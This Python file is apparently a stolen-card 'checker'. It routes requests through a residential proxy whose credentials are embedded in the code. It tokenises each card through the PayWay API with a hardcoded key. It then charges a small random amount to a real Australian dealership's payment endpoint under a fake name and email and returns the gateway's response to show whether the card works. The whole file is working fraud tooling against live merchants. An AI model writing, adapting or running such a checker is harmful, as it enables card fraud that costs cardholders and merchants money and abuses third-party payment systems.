import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "bd.porterproxies.com:8888:user-PP_FBBG3PY7GO-country-US-plan-luminati:nsugwlie"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.payway.com.au',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'authorization': 'Basic UTQwNzcxX1BVQl9ycmVlNzNzZXp3aHNxdWNtZ2twNzIyNmQ0cXB2ZGhiaWhqNnJ0ZXViMmg5Mnh1YXduNDk2NDZtM2VkOGs6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://api.payway.com.au',
	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-no-authenticate-basic': 'true',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'paymentMethod': 'creditCard',
	    'connectionType': 'FRAME',
	    'cardNumber': f'{n}',
	    'cvn': f'{cvc}',
	    'cardholderName': 'Dao Khao Saard',
	    'expiryDateMonth': f'{mm}',
	    'expiryDateYear': f'{yy}',
	    'threeDS2': 'false',
	}
	
	response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
	
	token = response.json()['singleUseTokenId']
	#print(token)
	
	headers = {
	    'authority': 'www.penfold.com.au',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://www.penfold.com.au',
	    'referer': 'https://www.penfold.com.au/online-payment',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'dealership_slug': '559',
	    'custom_amount': f'{random_amount1}.{random_amount2}',
	    'customer': {
	        'email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    },
	    'token': f'{token}',
	    'merchant_id': '6870786',
	    'order': {
	        'number': '1285482',
	    },
	}
	
	response = session.post(
	    'https://www.penfold.com.au/api/frizelle-st-george-payment',
	    headers=headers,
	    json=json_data,
	)
	
	result = re.search(r'"responseText":"(.*?)"', response.text).group(1)
	
	return (result)
